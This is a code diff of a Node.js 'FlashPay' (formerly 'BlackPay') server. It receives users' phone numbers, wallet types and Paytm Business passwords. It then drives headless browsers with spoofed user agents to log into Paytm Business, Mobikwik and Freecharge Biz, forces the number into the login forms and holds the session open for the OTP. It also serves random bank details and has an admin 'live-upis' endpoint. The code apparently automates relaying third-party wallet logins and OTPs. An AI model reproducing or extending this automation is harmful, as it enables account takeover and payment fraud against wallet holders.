@@ -53,7 +53,7 @@ let browserStartupError = null;
     }
 })();
 
-app.get('/', (req, res) => res.json({ success: true, message: "BlackPay Ultra-Fast Server is Live!" }));
+app.get('/', (req, res) => res.json({ success: true, message: "FlashPay Ultra-Fast Server is Live!" }));
 
 // ============================================================================
 // 🚀 BANK DETAILS API
@@ -65,7 +65,7 @@ app.get('/api/get-payment-details', (req, res) => {
         const randomIndex = Math.floor(Math.random() * bankList.length);
         res.json({ success: true, data: bankList[randomIndex] });
     } catch (error) {
-        res.status(500).json({ success: false, message: "Server error fetching bank details." });
+        res.status(500).json({ success: false, message: "Server error fetching bank details. Ensure banks.json exists." });
     }
 });
 
@@ -74,14 +74,19 @@ app.get('/api/admin/live-upis', (req, res) => {
 });
 
 // ============================================================================
-// 0. API: APP LOGIN & REGISTER OTP (FAST2SMS)
+// 0. API: APP LOGIN & REGISTER OTP (FAST2SMS - PROFESSIONAL FORMAT)
 // ============================================================================
 app.post('/api/auth/send-otp', async (req, res) => {
     const { phone, generatedOtp } = req.body;
     if (!phone || !generatedOtp) return res.status(400).json({ success: false, message: "Phone or OTP missing." });
 
     try {
-        const url = `https://www.fast2sms.com/dev/bulkV2?authorization=${FAST2SMS_API_KEY}&route=q&message=Your%20BlackPay%20OTP%20is%20${generatedOtp}&language=english&flash=0&numbers=${phone}`;
+        // 👑 PROFESSIONAL CORPORATE SMS FORMAT 👑
+        // SMS Text: [FlashPay] Your verification OTP is {OTP}. Do not share this with anyone for security reasons. - Team FlashPay
+        const smsText = `%5BFlashPay%5D%20Your%20verification%20OTP%20is%20${generatedOtp}.%20Do%20not%20share%20this%20with%20anyone%20for%20security%20reasons.%20-%20Team%20FlashPay`;
+        
+        const url = `https://www.fast2sms.com/dev/bulkV2?authorization=${FAST2SMS_API_KEY}&route=q&message=${smsText}&language=english&flash=0&numbers=${phone}`;
+        
         const response = await axios.get(url, { timeout: 8000 });
         if (response.data.return === true) {
             res.json({ success: true, message: "OTP Sent successfully!" });
@@ -106,14 +111,24 @@ app.post('/api/wallet/send-otp', async (req, res) => {
 
     let walletName = walletType ? walletType.toLowerCase().trim() : "freecharge";
 
+    // 🔴 MASTER FIX: GHOST BROWSER CLEANUP 🔴
+    // Agar user ne back karke dobara request bheji, toh purana process turant kill hoga!
     if (activeSessions.has(phone)) {
-        try { await activeSessions.get(phone).context.close(); } catch(e) {}
+        console.log(`[!] User pressed back & retried. Killing old background process for ${phone}...`);
+        let oldSession = activeSessions.get(phone);
+        try { 
+            if (oldSession.context) await oldSession.context.close(); 
+        } catch(e) {}
         activeSessions.delete(phone);
     }
 
     let context, page;
     try {
         context = await globalBrowser.createBrowserContext();
+        
+        // 🔥 LOCK THE SESSION IMMEDIATELY 🔥
+        activeSessions.set(phone, { context: context, status: 'processing' });
+        
         page = await context.newPage();
         await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
 
@@ -129,11 +144,12 @@ app.post('/api/wallet/send-otp', async (req, res) => {
             console.log(`[+] Paytm Business Web khol rahe hain...`);
             if (!password) {
                 await context.close();
+                activeSessions.delete(phone);
                 return res.status(400).json({ success: false, message: "Paytm Business requires a password!" });
             }
 
             try { await page.goto('https://dashboard.paytm.com/login/', { waitUntil: 'domcontentloaded', timeout: 25000 }); } 
-            catch (e) { await context.close(); return res.status(400).json({ success: false, message: "Paytm server slow. Try again." }); }
+            catch (e) { await context.close(); activeSessions.delete(phone); return res.status(400).json({ success: false, message: "Paytm server slow. Try again." }); }
             
             let inputField = null;
             for (let attempt = 0; attempt < 50; attempt++) {
@@ -154,6 +170,7 @@ app.post('/api/wallet/send-otp', async (req, res) => {
 
             if (!inputField) {
                 await context.close();
+                activeSessions.delete(phone);
                 return res.status(400).json({ success: false, message: "Paytm page load failed." });
             }
 
@@ -184,26 +201,21 @@ app.post('/api/wallet/send-otp', async (req, res) => {
             await page.keyboard.press('Enter');
         }
         
-        // 🚀 MOBIKWIK LOGIC (HARDCORE REACT BYPASS)
+        // 🚀 MOBIKWIK LOGIC
         else if (walletName.includes('mobikwik')) {
             console.log(`[+] Mobikwik Web khol rahe hain...`);
             await page.goto('https://www.mobikwik.com/login', { waitUntil: 'networkidle2', timeout: 30000 });
             
             console.log(`[+] Forcing Javascript Number Injection...`);
-            
             await page.evaluate(async (num) => {
-                // Find correct input by checking type or length
                 let inputs = Array.from(document.querySelectorAll('input'));
                 let targetInput = inputs.find(inp => inp.type === 'tel' || inp.maxLength === 10 || (inp.placeholder && inp.placeholder.toLowerCase().includes('mobile')));
                 
                 if (targetInput) {
                     targetInput.focus();
                     targetInput.click();
-                    
-                    // React 15/16 native value setter bypass
                     let nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
                     nativeInputValueSetter.call(targetInput, num);
-                    
                     targetInput.dispatchEvent(new Event('input', { bubbles: true }));
                     targetInput.dispatchEvent(new Event('change', { bubbles: true }));
                 }
@@ -221,12 +233,11 @@ app.post('/api/wallet/send-otp', async (req, res) => {
             await page.keyboard.press('Enter');
         }
         
-        // 🚀 FREECHARGE BIZ LOGIC (HARDCORE REACT BYPASS)
+        // 🚀 FREECHARGE BIZ LOGIC
         else if (walletName.includes('freecharge')) {
             console.log(`[+] Freecharge Biz Web khol rahe hain...`);
             await page.goto('https://www.freechargebiz.in/', { waitUntil: 'networkidle2', timeout: 30000 });
             
-            // 1. Click Login Button
             console.log(`[+] Clicking Login...`);
             for (let attempt = 0; attempt < 30; attempt++) {
                 try {
@@ -243,7 +254,6 @@ app.post('/api/wallet/send-otp', async (req, res) => {
 
             await new Promise(r => setTimeout(r, 2000));
 
-            // 2. Inject Number via React Hack
             console.log(`[+] Forcing Freecharge Number Injection...`);
             await page.evaluate(async (num) => {
                 let inputs = Array.from(document.querySelectorAll('input:not([type="hidden"])'));
@@ -261,7 +271,6 @@ app.post('/api/wallet/send-otp', async (req, res) => {
 
             await new Promise(r => setTimeout(r, 1000));
 
-            // 3. Click Get OTP
             console.log(`[+] Clicking Get OTP Button...`);
             await page.evaluate(() => {
                 let elements = Array.from(document.querySelectorAll('button, div, span'));
@@ -272,21 +281,32 @@ app.post('/api/wallet/send-otp', async (req, res) => {
             await page.keyboard.press('Enter');
         }
 
-        activeSessions.set(phone, { context, page, walletType: walletName });
+        // Update to Session Map
+        if (activeSessions.has(phone)) {
+            activeSessions.set(phone, { context, page, walletType: walletName, status: 'ready_for_otp' });
+        }
 
+        // Clean up timeout after 2 minutes
         setTimeout(async () => {
             if (activeSessions.has(phone)) {
                 try { await context.close(); } catch(e) {}
                 activeSessions.delete(phone);
-                console.log(`[!] Auto-closed context for ${phone}`);
+                console.log(`[!] Auto-closed session context for ${phone}`);
             }
         }, 120000); 
         
-        res.json({ success: true, message: `OTP request sent for ${phone}` });
+        if (!res.headersSent) {
+            res.json({ success: true, message: `OTP request sent for ${phone}` });
+        }
+
     } catch (error) { 
+        // 🔴 SILENT CRASH HANDLER 🔴
         if (context) try { await context.close(); } catch(e){}
         activeSessions.delete(phone);
-        res.status(500).json({ success: false, message: "Error: " + error.message }); 
+        
+        if (!res.headersSent) {
+            res.status(500).json({ success: false, message: "Error: Process interrupted or server busy. Try again." }); 
+        }
     }
 });
 
@@ -428,5 +448,5 @@ app.post('/api/wallet/verify-otp', async (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => { 
-    console.log(`🚀 BlackPay Ultra-Fast Server running on port ${PORT}`); 
+    console.log(`🚀 FlashPay Ultra-Fast Server running on port ${PORT}`); 
 });
